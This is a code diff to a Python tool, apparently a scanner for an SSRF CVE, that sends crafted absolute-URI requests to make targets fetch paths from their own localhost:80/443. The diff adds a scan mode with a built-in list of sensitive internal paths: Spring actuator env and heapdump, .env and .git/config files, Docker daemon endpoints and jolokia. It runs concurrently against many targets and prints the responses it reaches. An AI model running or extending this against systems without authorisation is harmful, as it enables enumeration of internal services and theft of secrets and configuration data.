@@ -54,6 +54,47 @@ DEFAULT_PROBE_PATH = "/x"  # arbitrary; becomes the path on localhost:80 of the 
 
 HTTP_STATUS_RE = re.compile(r"^HTTP/1\.\d (\d{3}) ")
 
+# Common paths that often surface co-located services on localhost. The SSRF
+# in this CVE is pinned to the target's localhost:80/443, so these are the
+# kinds of paths that can reveal what (if anything) is listening there.
+DEFAULT_SCAN_PATHS = [
+    "/",
+    "/index.html",
+    # apache / nginx status modules
+    "/server-status", "/server-info",
+    "/nginx_status", "/stub_status",
+    # health & status
+    "/health", "/healthz", "/_health", "/status", "/_status", "/ping",
+    "/ready", "/readyz", "/live", "/livez",
+    # metrics
+    "/metrics", "/prometheus", "/_metrics",
+    # admin panels (common framework defaults)
+    "/admin", "/admin/", "/administrator/",
+    "/manager/html",     # tomcat
+    "/console",          # weblogic / others
+    "/wp-admin/", "/wp-login.php",
+    # generic apis
+    "/api", "/api/v1", "/api/v2",
+    # spring boot actuator
+    "/actuator", "/actuator/env", "/actuator/health",
+    "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
+    "/actuator/heapdump", "/actuator/threaddump",
+    # go pprof / expvar
+    "/debug/vars", "/debug/pprof/", "/debug/pprof/heap",
+    # docker daemon over http
+    "/containers/json", "/version", "/info", "/images/json",
+    # leaky config files often dropped at webroot
+    "/.env", "/.git/config", "/.git/HEAD", "/config", "/config.json",
+    # php classics
+    "/phpinfo.php", "/info.php", "/phpmyadmin/",
+    # elasticsearch
+    "/_cat/indices", "/_cluster/health", "/_nodes",
+    # jmx / jolokia
+    "/jmx-console/", "/jolokia/list",
+    # next.js itself (loopback when next is the localhost service)
+    "/_next/static/",
+]
+
 
 def build_payload(absolute_uri: str, target_host_header: str) -> bytes:
     lines = [
@@ -118,8 +159,9 @@ async def probe_one(
     try:
         host, port, is_tls = parse_target(target)
     except ValueError as e:
-        return {"target": target, "token": token, "status": "invalid",
-                "verdict": "error", "impact_confirmed": False, "error": str(e)}
+        return {"target": target, "probe_path": probe_path, "token": token,
+                "status": "invalid", "verdict": "error",
+                "impact_confirmed": False, "error": str(e)}
 
     host_header = host if port in (80, 443) else f"{host}:{port}"
     # absolute-form request-URI; the path includes the token so log inspection
@@ -142,8 +184,9 @@ async def probe_one(
                 asyncio.open_connection(host, port), timeout=timeout
             )
     except (asyncio.TimeoutError, OSError, ssl.SSLError) as e:
-        return {"target": target, "token": token, "status": "connect_error",
-                "verdict": "error", "impact_confirmed": False, "error": str(e)}
+        return {"target": target, "probe_path": probe_path, "token": token,
+                "status": "connect_error", "verdict": "error",
+                "impact_confirmed": False, "error": str(e)}
 
     try:
         writer.write(payload)
@@ -163,6 +206,7 @@ async def probe_one(
         verdict, impact_confirmed, extras = classify(snippet)
         result = {
             "target": target,
+            "probe_path": probe_path,
             "token": token,
             "status": "sent",
             "verdict": verdict,
@@ -172,8 +216,9 @@ async def probe_one(
         result.update(extras)
         return result
     except OSError as e:
-        return {"target": target, "token": token, "status": "send_error",
-                "verdict": "error", "impact_confirmed": False, "error": str(e)}
+        return {"target": target, "probe_path": probe_path, "token": token,
+                "status": "send_error", "verdict": "error",
+                "impact_confirmed": False, "error": str(e)}
     finally:
         try:
             writer.close()
@@ -182,14 +227,15 @@ async def probe_one(
             pass
 
 
-async def run(targets, probe_path, concurrency, timeout, verify_tls):
+async def run(targets, paths, concurrency, timeout, verify_tls):
     sem = asyncio.Semaphore(concurrency)
 
-    async def bound(t):
+    async def bound(t, p):
         async with sem:
-            return await probe_one(t, probe_path, timeout, verify_tls)
+            return await probe_one(t, p, timeout, verify_tls)
 
-    return await asyncio.gather(*(bound(t) for t in targets))
+    tasks = [bound(t, p) for t in targets for p in paths]
+    return await asyncio.gather(*tasks)
 
 
 def load_targets(args) -> list[str]:
@@ -237,6 +283,14 @@ def main() -> int:
                    help="Path component used in the crafted request-URI. "
                         "Becomes the path on the target's localhost service. "
                         f"Default: {DEFAULT_PROBE_PATH}")
+    p.add_argument("--scan", action="store_true",
+                   help="After detection, probe a built-in list of common "
+                        "paths (status pages, admin panels, actuator, debug "
+                        "endpoints, etc.) to enumerate any service co-located "
+                        "on the target's localhost:80/443.")
+    p.add_argument("--scan-paths-file",
+                   help="File with paths (one per line, '#' for comments) to "
+                        "use instead of the built-in scan list. Implies --scan.")
     p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
     p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
     p.add_argument("--insecure", action="store_true",
@@ -249,44 +303,104 @@ def main() -> int:
     if not targets:
         p.error("provide --target, --targets-file, or pipe targets on stdin")
 
+    if args.scan_paths_file:
+        with open(args.scan_paths_file) as f:
+            paths = [l.strip() for l in f
+                     if l.strip() and not l.strip().startswith("#")]
+        scan_mode = True
+    elif args.scan:
+        paths = DEFAULT_SCAN_PATHS
+        scan_mode = True
+    else:
+        paths = [args.probe_path]
+        scan_mode = False
+
     results = asyncio.run(
-        run(targets, args.probe_path, args.concurrency, args.timeout, not args.insecure)
+        run(targets, paths, args.concurrency, args.timeout, not args.insecure)
     )
 
-    for r in results:
-        if args.json:
-            print(json.dumps(r))
-        else:
-            tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
-            impact = "YES" if r.get("impact_confirmed") else " no"
-            line = (
-                f"[{tag:>5}] target={r['target']:<40}"
-                f"  verdict={r['verdict']:<28}  impact={impact}"
-            )
-            if r.get("upstream_status"):
-                line += f"  upstream={r['upstream_status']}"
-            if r.get("upstream_server"):
-                line += f" ({r['upstream_server']!r})"
-            if "error" in r:
-                line += f"  error={r['error']}"
-            print(line)
-            if r.get("impact_confirmed") and r.get("response_snippet"):
-                print(f"        snippet: {r['response_snippet'][:200]!r}")
-            elif r.get("response_snippet") and r["verdict"] == "vulnerable":
-                print(f"        snippet: {r['response_snippet'][:80]!r}")
-
-    if not args.json:
-        counts: dict[str, int] = {}
-        impacts = 0
+    if args.json:
         for r in results:
-            counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
-            if r.get("impact_confirmed"):
-                impacts += 1
-        print()
-        for verdict, n in sorted(counts.items()):
-            print(f"  {verdict}: {n}")
-        print(f"  impact_confirmed: {impacts}")
+            print(json.dumps(r))
+        return 0
+
+    if scan_mode:
+        _print_scan(results)
+    else:
+        for r in results:
+            _print_single(r)
+
+    # final summary across all results
+    counts: dict[str, int] = {}
+    impacts = 0
+    for r in results:
+        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
+        if r.get("impact_confirmed"):
+            impacts += 1
+    print()
+    print("overall:")
+    for verdict, n in sorted(counts.items()):
+        print(f"  {verdict}: {n}")
+    print(f"  impact_confirmed: {impacts}")
     return 0
+
+
+def _print_single(r: dict) -> None:
+    tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
+    impact = "YES" if r.get("impact_confirmed") else " no"
+    line = (
+        f"[{tag:>5}] target={r['target']:<40}"
+        f"  verdict={r['verdict']:<28}  impact={impact}"
+    )
+    if r.get("upstream_status"):
+        line += f"  upstream={r['upstream_status']}"
+    if r.get("upstream_server"):
+        line += f" ({r['upstream_server']!r})"
+    if "error" in r:
+        line += f"  error={r['error']}"
+    print(line)
+    if r.get("impact_confirmed") and r.get("response_snippet"):
+        print(f"        snippet: {r['response_snippet'][:200]!r}")
+    elif r.get("response_snippet") and r["verdict"] == "vulnerable":
+        print(f"        snippet: {r['response_snippet'][:80]!r}")
+
+
+def _print_scan(results: list[dict]) -> None:
+    by_target: dict[str, list[dict]] = {}
+    for r in results:
+        by_target.setdefault(r["target"], []).append(r)
+
+    for target, rows in by_target.items():
+        print(f"\n=== {target} ===")
+        # detection summary: vulnerable if ANY row says so
+        any_vuln = any(r["verdict"].startswith("vulnerable") for r in rows)
+        any_impact = any(r.get("impact_confirmed") for r in rows)
+        if not any_vuln:
+            print("  (not vulnerable / no signal — skipping detail)")
+            continue
+        for r in rows:
+            tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
+            impact = "YES" if r.get("impact_confirmed") else " - "
+            path = r.get("probe_path", "?")
+            line = f"  [{tag:>5}] {path:<30} impact={impact}"
+            if r.get("upstream_status"):
+                line += f"  status={r['upstream_status']}"
+            if r.get("upstream_content_type"):
+                line += f"  ct={r['upstream_content_type']!r}"
+            if r.get("error"):
+                line += f"  err={r['error']}"
+            print(line)
+
+        if any_impact:
+            servers = {r.get("upstream_server")
+                       for r in rows if r.get("upstream_server")}
+            servers.discard(None)
+            hits = [r for r in rows if r.get("impact_confirmed")]
+            print(f"  -> {len(hits)}/{len(rows)} paths reached a service")
+            if servers:
+                print(f"  -> upstream server(s) seen: {', '.join(sorted(s for s in servers if s))}")
+        else:
+            print("  -> bug present but nothing answering on localhost:80/443")
 
 
 if __name__ == "__main__":
